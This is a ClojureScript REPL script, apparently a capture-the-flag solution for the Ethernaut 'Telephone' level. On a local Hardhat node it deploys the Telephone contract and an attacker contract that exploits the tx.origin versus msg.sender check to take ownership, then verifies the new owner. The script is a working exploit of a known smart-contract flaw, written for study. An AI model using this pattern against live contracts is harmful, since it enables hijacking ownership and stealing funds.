(ns telephone
  (:require [wallets :as w]
            [utils :as u]))


(def telephone (atom ""))
(def attacker (atom ""))


(comment

  ;; Deploy to local hardhat node for testing
  ;; and get the address of the Telephone contract.
  (-> (.deploy (u/contract :telephone w/local-wallet))
      (.then #(reset! telephone %))
      (.catch #(.log js/console %)))


  ;; Deploy the "attacker" contract
  ;; with required address, we are exploiting the contract
  ;; in the attacker's constructor

  ;; `(tx.origin != msg.sender)` this is the vulnerable line
  ;; if we call the Telephone contract from an EOA:
  ;;
  ;; tx.orgin == msg.sender, to make them unequal
  ;; we used an attacker contract to call the
  ;; changeOwner function on the Telephone contract.
  (-> (.deploy (u/contract :telephone/attack w/local-wallet)
               (.-address @telephone)
               (.-address w/local-wallet))
      (.then #(reset! attacker %))
      (.catch #(.log js/console %)))

  ;; Wait for the attacker contract to be depoyed.a
  (.then (.wait (.-deployTransaction @attacker))
         #(.log js/console "Deployed: " %))

  ;; Check the who is the owner of Telephone Contract now.
  (-> (.owner @telephone)
      (.then #(.log js/console
                    (str "Expected: "
                         (.-address w/local-wallet)
                         " Got: "
                         %)))
      (.catch #(.log js/console %)))




  )
